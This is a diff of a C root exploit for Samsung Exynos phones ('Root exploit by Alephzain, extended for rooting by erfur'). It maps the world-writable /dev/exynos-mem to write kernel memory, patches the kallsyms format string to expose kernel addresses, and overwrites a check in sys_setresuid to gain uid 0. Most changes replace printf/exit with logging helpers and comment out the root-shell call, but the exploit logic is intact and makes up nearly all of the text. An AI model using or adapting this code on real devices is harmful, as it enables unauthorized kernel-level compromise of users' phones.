@@ -1,15 +1,5 @@
 /*
- * exynos-mem device abuse by alephzain
- *
- * /dev/exynos-mem is present on GS3/GS2/GN2/MEIZU MX
- *
- * the device is R/W by all users :
- * crw-rw-rw-  1 system graphics  1, 14 Dec 13 20:24 /dev/exynos-mem
- *
- */
-
-/*
- * Abuse it for root shell
+ * Root exploit by Alephzain, extended for rooting by erfur
  */
 #include <stdio.h>
 #include <sys/mman.h>
@@ -40,12 +30,7 @@ int main(int argc, char **argv, char **env) {
     unsigned long addr_sym;
 
 	int page_size = sysconf(_SC_PAGE_SIZE);
-    printf("[*] page size is %d\n", page_size);
-
-    /* for root shell */
-    char *cmd[2];
-    cmd[0] = "/system/bin/sh";
-    cmd[1] = NULL;
+    info("page size is %d", page_size);
 
     /* /proc/kallsyms parsing */
     FILE *kallsyms = NULL;
@@ -58,8 +43,7 @@ int main(int argc, char **argv, char **env) {
     /* open the door */
 	fd = open("/dev/exynos-mem", O_RDWR);
 	if (fd == -1) {
-		printf("[!] Error opening /dev/exynos-mem\n");
-		exit(1);
+		fatal("Error opening /dev/exynos-mem");
 	}
 
     /* kernel reside at the start of physical memory, so take some Mb */
@@ -67,10 +51,10 @@ int main(int argc, char **argv, char **env) {
     // However, the patch is incomplete and allows an overflow to bypass the check.
     paddr = (unsigned long *)mmap(NULL, 0x50000000UL, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0xfffff000UL);
     if (paddr == MAP_FAILED) {
-        printf("[!] Error mmap: %s|%08X\n",strerror(errno), i);
-        exit(1);
+        fatal("Error mmap: %s|%08X",strerror(errno), i);
     }
-    printf("[*] mmap success at 0x%lx\n", paddr);
+    
+    info("mmap success at 0x%lx", paddr);
 
     // wrap around the memory
     tmp = paddr + kern_offset;
@@ -97,17 +81,16 @@ int main(int argc, char **argv, char **env) {
     fclose(fd_dump);
 #endif
 
-
-    info("Looking for magic bytes...");
     /*
      * search the format string "%pK %c %s\n" in memory
      * and replace "%pK" by "%p" to force display kernel
      * symbols pointer
      */
+    info("Looking for magic bytes...");
     for(m = 0; m < length*4; m += 4) {
 
         if(*(unsigned long *)tmp == 0x204b7025 && *(unsigned long *)(tmp+1) == 0x25206325 && *(unsigned long *)(tmp+2) == 0x00000a73 ) {
-            printf("[*] s_show->seq_printf format string found at: 0x%08X\n", PAGE_OFFSET + m);
+            info("s_show->seq_printf format string found at: 0x%08X", PAGE_OFFSET + m);
             restore_ptr_fmt = tmp;
             *(unsigned long*)tmp = 0x20207025;
             found = true;
@@ -117,8 +100,7 @@ int main(int argc, char **argv, char **env) {
     }
 
     if (found == false) {
-        printf("[!] s_show->seq_printf format string not found\n");
-        exit(1);
+        fatal("s_show->seq_printf format string not found");
     }
 
     found = false;
@@ -126,8 +108,7 @@ int main(int argc, char **argv, char **env) {
     /* kallsyms now display symbols address */       
     kallsyms = fopen("/proc/kallsyms", "r");
     if (kallsyms == NULL) {
-        printf("[!] kallsysms error: %s\n", strerror(errno));
-        exit(1);
+        fatal("kallsysms error: %s", strerror(errno));
     }
 
     /* parse /proc/kallsyms to find sys_setresuid address */
@@ -140,7 +121,7 @@ int main(int argc, char **argv, char **env) {
             index++;
             if (index == 3) {
                 if (strncmp("sys_setresuid\n", str, 14) == 0) {
-                    printf("[*] sys_setresuid found at 0x%08X\n",addr_sym);
+                    info("sys_setresuid found at 0x%08X",addr_sym);
                     found = true;
                 }
                 break;
@@ -151,7 +132,7 @@ int main(int argc, char **argv, char **env) {
             tmp += (addr_sym - PAGE_OFFSET) >> 2;
             for(m = 0; m < 128; m += 4) {
                 if (*(unsigned long *)tmp == 0xe3500000) {
-                    printf("[*] patching sys_setresuid at 0x%08X\n",addr_sym+m);
+                    info("patching sys_setresuid at 0x%08X",addr_sym+m);
                     restore_ptr_setresuid = tmp;
                     *(unsigned long *)tmp = 0xe3500001;
                     break;
@@ -176,8 +157,7 @@ int main(int argc, char **argv, char **env) {
     result = setresuid(0, 0, 0);
 
     if (result) {
-        printf("[!] set user root failed: %s\n", strerror(errno));
-        exit(1);
+        fatal("set user root failed: %s", strerror(errno));
     }
 
     /* restore memory */
@@ -242,7 +222,8 @@ int main(int argc, char **argv, char **env) {
 
     /* execute a root shell */
     // info("getting root shell...");
-    // execve (cmd[0], cmd, env);
+    // char *shell_args = {"/system/bin/sh", NULL};
+    // execve (shell_args[0], shell_args, env);
 
 	return 0;
 }
